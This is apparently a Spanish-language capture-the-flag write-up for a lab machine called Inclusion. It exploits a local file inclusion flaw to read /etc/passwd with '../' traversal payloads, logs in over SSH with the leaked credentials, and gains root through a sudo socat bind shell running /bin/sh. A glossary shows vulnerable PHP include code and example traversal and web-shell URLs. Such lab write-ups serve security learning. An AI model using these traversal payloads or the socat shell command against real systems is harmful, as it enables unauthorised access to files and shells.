# Machine Inclusion

## Informtion Gathering

1. Primero realizo un escaneo de puerto asi:

```
$ nmap -sV 10.10.59.190
``` 
2. El resultado es el siguiente:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
```

## Analisis de vulnerabilidades

- Luego ejecute dirb de esta manera
```
$ dirb http://10.10.59.190
```
- El resultado que me genero son unas URL que no sirven de nada

## Exploiting

- Al ver que la pagina web tiene un articulo de **LFI**, cuando doy click al botn me redirecciona a otra pagina en el cual tiene una descripcion de que es **LFI** pero su URL es esta:
```
http://10.10.59.190/article?name=lfiattack
```
- Entonces observe en la URL que hay un parámetro llamado **name**. Esto indica que el sitio web incluye información de otros lugares, lo que nos abre a un ataque de inclusión de archivos locales

- Para decirlo de otra manera. La página que estamos viendo está realmente vacía; sin embargo, incluye contenido de otra página. En el ejemplo, esa otra página es **rfiattack**, sin embargo, esto dependerá de qué enlace haya hecho clic.

- Las inclusiones de archivos locales son cuando esa entrada no se desinfecta correctamente, lo que nos permite manipular el enlace para abrir otros archivos. Probemos eso ahora con el **/etc/passwd** archivo, que nos dará una lista de cuentas de usuario en la máquina.

Haremos esto cambiando el bit al final de la URL, después del **=**. Sin embargo, no podemos simplemente cambiarlo para que sea **/etc/passwd**, porque eso solo se verá en el directorio actual , que obviamente no contendrá el archivo que estamos buscando. En su lugar, vamos a tener que volver al inicio del sistema de archivos y luego seguir desde allí.

Al final, tendremos una carga útil que se parece a esto **../../../../../../etc/passwd**. Observe las numerosas ocurrencias de **../**, que se utilizan para subir un directorio, lo que finalmente nos lleva de vuelta al directorio raíz del sistema de archivos. El número que use aquí no importa, siempre que haya suficientes para garantizar que volverá al principio.

- Entonces nuestro ataque final es este:
```
http://10.10.59.190/article?name=../../../../../../etc/passwd
```
- El resultado es el contenido de el **/etc/passwd** y hay un usuario y contraseña que es este:
```
falconfeast:rootpassword
```
- Pruebo esas contraseñas en **SSH** y ha funcionado
- Luego puedo sacar la bandera de **user.txt**
- Vamos a ejecutar el **sudo -l** para ver que archivos se pueden ejecutar como root
- El resultado fue este:
```
(root) NOPASSWD: /usr/bin/socat
```
- Entonces decido buscar algun exploit y encontre que primero en la shell de la victima ejecuto esto:
```
$ sudo socat TCP4-LISTEN:1234,reusaddr EXEC:"/bin/sh"
```
- En maquina de Kali debo escuchar ese puerto asì colocando la IP de la maquina victima:
```
$ sudo socat – TCP4:10.10.59.190:1234
```
- Ya con esto soy **root** y puedo sacar la bandera de root

## Glosario

- **RFI:** 

- **LFI:** Un atacante puede usar la Inclusión de Archivos Locales (LFI) para engañar a la aplicación web para que exponga o ejecute archivos en el servidor web. Un ataque LFI puede llevar a la divulgación de información, a la ejecución remota de código, o incluso a Cross-site Scripting (XSS). Típicamente, LFI ocurre cuando una aplicación usa la ruta de un archivo como entrada. Si la aplicación trata esta entrada como confiable, se puede usar un archivo local en la declaración de inclusión.

- La inclusión de archivos locales es muy similar a la inclusión de archivos remotos (RFI). Sin embargo, un atacante que utilice LFI sólo puede incluir archivos locales (no archivos remotos como en el caso de RFI).

- El siguiente es un ejemplo de código PHP que es vulnerable a LFI:
```
* Obtener el nombre de archivo de una entrada GET

Example - http://example.com/?file=filename.php

$file = $_GET[&#39;file&#39;];

* Incluir el archivo de forma insegura

Example - filename.php

include(&#39;directory/&#39; . $file);

```
- En el ejemplo anterior, un atacante podría hacer la siguiente petición. Engaña a la aplicación para que ejecute un script PHP como un shell web que el atacante logró subir al servidor web.
```
http://example.com/?file=../../uploads/evil.php
```
- En este ejemplo, el archivo cargado por el atacante será incluido y ejecutado por el usuario que ejecuta la aplicación web. Eso permitiría a un atacante ejecutar cualquier código malicioso del lado del servidor que desee.

- Este es el peor de los casos. Un atacante no siempre tiene la capacidad de subir un archivo malicioso a la aplicación. Incluso si lo hicieran, no hay garantía de que la aplicación guarde el archivo en el mismo servidor en el que existe la vulnerabilidad LFI. Incluso entonces, el atacante aún necesitaría conocer la ruta del disco del archivo cargado.

- Incluso sin la capacidad de cargar y ejecutar código, una vulnerabilidad de Inclusión de Archivos Locales puede ser peligrosa. Un atacante todavía puede realizar un ataque de Directory Traversal / Path Traversal usando una vulnerabilidad LFI como sigue.
```
http://example.com/?file=../../../../etc/passwd
```
- En el ejemplo anterior, un atacante puede obtener el contenido del archivo /etc/passwd que contiene una lista de usuarios en el servidor. Del mismo modo, un atacante puede aprovechar la vulnerabilidad de Directory Traversal para acceder a los archivos de registro (por ejemplo, access.log o error.log de Apache), el código fuente y otra información confidencial. Esta información puede utilizarse luego para adelantar un ataque.

- **/usr/bin/socat:**

## Investigación

- **exploit /usr/bin/socat:** https://www.hackingarticles.in/linux-for-pentester-socat-privilege-escalation/

- https://gtfobins.github.io/gtfobins/socat/

- **shell TTY Python:** https://netsec.ws/?p=337

## Explotación maquina Inclusion

- https://muirlandoracle.co.uk/2020/03/14/inclusion-write-up/